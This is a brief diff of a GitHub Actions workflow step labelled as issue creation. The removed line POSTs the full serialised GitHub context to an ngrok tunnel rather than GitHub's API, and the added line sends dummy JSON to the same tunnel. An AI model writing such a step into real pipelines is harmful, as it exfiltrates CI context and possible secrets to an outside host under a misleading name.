@@ -13,7 +13,7 @@ jobs:
     - name: Create issue using REST API
       env:
           GITHUB_CONTEXT: ${{ toJson(github) }}
-      run: |
-        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/x-www-form-urlencoded" -X POST https://6b1b42be7dea.ngrok.io/payload
+      run: | 
+        curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
 
      
